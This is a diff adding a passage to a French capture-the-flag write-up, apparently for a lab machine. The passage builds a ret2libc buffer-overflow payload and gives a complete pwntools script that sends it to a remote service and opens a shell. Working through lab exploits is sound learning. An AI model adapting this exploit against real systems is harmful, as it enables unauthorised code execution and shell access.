@@ -239,3 +239,38 @@ Pour illustrer notre payload :
 
 ![payload_schema](https://i.imgur.com/KtbdNeN.png)
 
+Nous devons convertir les adresses en little endian.
+Notre payload sera donc :
+
+`\x90 * 212 + \x60\xc0\xe4\xf7 +  \xf0\xfa\xe3\xf7 + \xd5\xdd\xf6\xf7`
+
+J'ai créer un script avec le module pwntools qui est très pratique en python :
+
+```py
+from pwn import *
+
+RHOST, RPORT = '10.10.10.61', 32812
+
+padding = 212
+pld = '\x90' * padding + p32(0xf7e4c060) + p32(0xf7e3faf0) + p32(0xf7f6ddd5)
+# Addr Sys + Addr Exit + Addr sh
+
+print `pld`
+
+r = remote(RHOST,RPORT)
+
+r.recvuntil('Enter Bridge Access Code: ')
+r.sendline('picarda1')
+
+r.recvuntil('Waiting for input: ')
+r.sendline('4')
+
+r.recvuntil('Enter Security Override:')
+r.sendline(pld)
+
+r.interactive()
+```
+
+Pour trouver le port cible nous pouvons lister les ports ouverts sur la machine :
+
+![port31812](https://i.imgur.com/cMMIQmh.png)
